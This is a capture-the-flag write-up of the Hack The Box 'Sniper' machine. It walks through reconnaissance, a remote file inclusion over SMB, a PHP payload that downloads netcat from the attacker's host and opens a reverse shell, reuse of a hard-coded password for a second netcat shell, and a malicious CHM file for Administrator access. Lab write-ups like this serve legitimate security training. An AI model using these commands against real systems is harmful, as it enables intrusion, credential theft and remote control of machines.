



![/images/Sniper/card.png](/images/Sniper/card.png)

**Contents**

Short Summary

- Phase 1 - Reconnaissance.

    1.1 Running Nmap.

- Phase 2 - Scanning.
    - 2.1 Scanning port **80.**

        2.1.1 User portal scanning.

        2.1.2 /blog scanning.

- Phase 3 - Gaining Access.

    3.1 Exploit Remote File Inclusion to get a reverse shell..

- Phase 4 - Elevate privileges.

    4.1 From **iusr** to **Chris**

    4.2 From **Chris** to **root**

### **Summary**

The machine was about:

1- Web Application running a blog with **change blog posts language** function that is vulnerable to **RFI**.

2- Exploiting the **RFI** to get a reverse shell as **iusr**.

3- After getting the shell, You discover a **hard-coded password** of **Chris** user in db.php file.

4- Using **Chris** credentials we get a user shell on the box.

5- Found a **note.tx**t in the **C:\Docs** directory file that orders chris to drop **chm** documents into this Docs directory.

6- We inject a payload into chm file and upload it to **C:\Docs** directory.

7- Our payload will be executed and you will get a shell.

### Reconnaissance

First we fire Nmap against the machine IP, doing a full-port TCP scan and service, OS detection then saving the output to a file *full-scan*

PS: Doing a full-port scan takes more time than a normal scan does, but ensures that you don't miss anything.

    nmap -p- -A -T 4 -v -oA full-scan 10.10.10.151

Nmap output

    Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 12:25 WET
    Scanning 10.10.10.151 [65535 ports]
    Discovered open port 135/tcp on 10.10.10.151
    Discovered open port 80/tcp on 10.10.10.151
    Discovered open port 139/tcp on 10.10.10.151
    Discovered open port 445/tcp on 10.10.10.151
    Completed Connect Scan at 12:31, 389.19s elapsed (65535 total ports)
    Initiating Service scan at 12:31
    Scanning 4 services on 10.10.10.151
    Nmap scan report for 10.10.10.151
   
    PORT    STATE SERVICE       VERSION
    80/tcp  open  http          Microsoft IIS httpd 10.0
    | http-methods:
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Sniper Co.
    135/tcp open  msrpc         Microsoft Windows RPC
    139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds?
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
   
    Host script results:
    |_clock-skew: 7h02m20s
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2020-03-27T19:34:32
    |_  start_date: N/A
   

From the output, we extracted some information.

1. The host is running on **Windows**.
2. 4 ports are opened **135**,**80**,**139**,**445.**
3. There is a web application running on port **80** with HTTP title **Sniper Co.**

I always start with web-based ports because most of the time they are higher risk than other services.

**Scanning Port 80**

We start brute-forcing directories/files on the webserver to see if there are any hidden gems.

    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.151/ -t 20

gobuster output:

![/images/Sniper/gobuster.png](/images/Sniper/gobuster.png)

From the gobuster output there are 2 links we can focus on /**user** & /**blog**

Port 80 main page:

![/images/Sniper/main-page.png](/images/Sniper/main-page.png)

from these cards the first 3 cards will redirect us to the same page but:

- **Our services** redirects to /**blog**
- **User Portal** redirects to  **/User**

 **Scanning /User link.**

![/images/Sniper/login.png](/images/Sniper/login.png)

Since we are doing HTB, Brute forcing credentials won't give you anything good. **You should try brute-forcing credentials if you are doing a real world assessment.**

but we can see that we can **Sign Up** so let's get us an account.

![/images/Sniper/register.png](/images/Sniper/register.png)

So after completing the form, the page will redirect us back to the login page. Enter your credentials and sign in.

![/images/Sniper/home-signin.png](/images/Sniper/home-signin.png)

Nothing here but let's check the source code.

![/images/Sniper/source-code.png](/images/Sniper/source-code.png)

It is just the SVG animation icon nothing important here. so we fire gobuster again against this portal but with our cookies.

    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.151/user -t 20 -H "PHPSESSID: 1qu8fu99kn9af8rnon6vj63tsa"

letting gobuster finish its work, we start scanning the **blog.**

![/images/Sniper/blog.png](/images/Sniper/blog.png)

So it's really a blog with dummy content as blog posts.

no functions here except for changing the language of the posts. and it is functional so we should test this function.

so the request to change the language will be.

English: http://10.10.10.151/blog/?lang=**blog-en.php** 

Spanish: http://10.10.10.151/blog/?lang=**blog-es.php**

so it loads different php page for every language!, So maybe we can test for **RFI/LFI, Path Traversal.**

### Gaining Access

**The File Inclusion vulnerability:**  allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.

- **Basic RFI**

    In basic RFI we simply test if we can request external/remote page by changing the parameter **lang** value to an external website.

    steps:

    - Start a local python server on our machine.
    - Send a request to our server.
    - check our server log to see if we get any requests from the server.

    the request will be something like http://10.10.10.151/blog/?lang=http://<ip>:<port>/anyfile

    Unfortunately, we didn't get any request from the server and the sniper server returned 404.

    even after adding a null byte at the end of the link it also fails.

    ![/images/Sniper/rfi-404.png](/images/Sniper/rfi-404.png)

- **LFI using wrappers**

    Using this method we try to get the source code of a page using something called **wrappers.** I will try using PHP wrapper you can search for other wrappers.

    the request will http://sniper.htb/blog/?lang=pHp://FilTer/convert.base64-encode/resource=blog-en.php ,the request will try to encode the source code of blog-en.php to base64 and send it back.

    but also this method fails.

    ![/images/Sniper/PHP-wrapper.png](/images/Sniper/PHP-wrapper.png)

- **Special Case**: **Bypass allow_url_include**

    When **allow_url_include** and **allow_url_fopen** are set to **Off**. It is still possible to include a remote file on **Windows** **servers** using the **smb** protocol. SOURCE

    so:

    1. Create a share **open to everyone.**
    2. Write a PHP code inside a file: `shell.php`
    3. Include it `http://sniper.htb/index.php?page=\\<YOUR_IP>\<SHARE_NAME>\shell.php`

    IMPORTANT NOTE : **Impacket smbserver** works great for transferring files but not so well for running files. so  **samba-server** works well you can install it from the package manager (apt in kali). Thanks to @blaudoom 

    so I created a PHP code that prints "**PHP isn't that cool**"

        <?php
        echo "PHP isn't that cool";
        ?>

    ![/images/Sniper/php-cool.png](/images/Sniper/php-cool.png)

And the PHP code is executed!. Great, now we should include a PHP reverse shell. Here is my php code to get a rev shell

    <?php
    exec('powershell.exe mkdir C:\temp; iwr -outf C:\temp\nc64.exe http://10.10.17.157:9090/nc64.exe C:\temp\mymy.exe 10.10.17.157 8888 -e powershell 2>&1', $output);
    print_r($output);
    ?>

the code is simple it just:

- mkdir **C:\temp**
- download  **nc.exe** from my machine to the **C:\temp** folder. executes nc to connect back to us

![/images/Sniper/shell.png](/images/Sniper/shell.png)

And NOW WE ARE IN!.

### Elevate privileges

1- **From iusr to Chris**

Now we are **iusr** which has fewer privileges than normal users. so checking the **C:\Users\** we found another user called **Chris.**

So let's go back to enumerate the web applications folder since we have access to it.

![/images/Sniper/user-folder.png](/images/Sniper/user-folder.png)

**user** folder ****is interesting to us since we couldn't test it more on the webserver**, let's see its contents.**

It has many files but db.php may have DB credentials hardcoded into the PHP file.

![/images/Sniper/db-php.png](/images/Sniper/db-php.png)

and we got a password `36mEAhz/B8xQ~2VM` so let's use this password and Chris as username to get more privilege.

so the commands to execute a program in the context of another user maybe like this

   
    $user = "sniper\Chris"  # to save the username in a variable called user
    $password = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force # convert the password to a plain-text string into password variable
    $credential = New-Object System.Management.Automation.PSCredential ($user, $password) # create a PS credentials object of chris and the db password
    Invoke-Command -ComputerName localhost -ScriptBlock { C:\\temp\\nc64.exe 10.10.17.157 7007 -e powershell.exe } -Credential $credential # run the nc64.exe to connect to us on port 7007 in the context of Chris user using the credentials object we created

![/images/Sniper/chris-shell.png](/images/Sniper/chris-shell.png)

Then we got our shell and here is the user flag.

2- **Elevate priv from Chris to Root.**

After some time exploring the folders, there is a file in the **C:\Docs** folder.

- note.txt

        Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.
        And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
        Regards,
        Sniper CEO.

So
1- The CEO is mad.

2- Chris has to drop a documentation file in this folder so there maybe a script that will execute/interact with this file. But what file exactly ?.

There is a **instructions.chm** (Microsoft Compiled HTML Help file) in **C:\Users\Chris\Downloads,**let's see what it is about. (I used my windows machine for this part)

![/images/Sniper/pff.png](/images/Sniper/pff.png)

So Chris also mad (very BAD work environment) but let's make his wish come true.

**Attack Vectors**

1- Inject a payload into chm document.

**[Nishang Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)** powershell script will inject our payload into valid **chm** format. You will need **HTML Help Workshop** program installed you can download it from Microsoft website.

![/images/Sniper/chm-payload.png](/images/Sniper/chm-payload.png)

Basically the script takes the payload specified and injects it into a valid chm document.

The **payload** just runs the netcat to connect back to us on port 7008.

2- Upload the malicious chm file to the victim machine into folder **C:\Docs**

3- The file will be executed and you will get a **shell as Administrator.**

![/images/Sniper/root.png](/images/Sniper/root.png)

**And Rooted #**
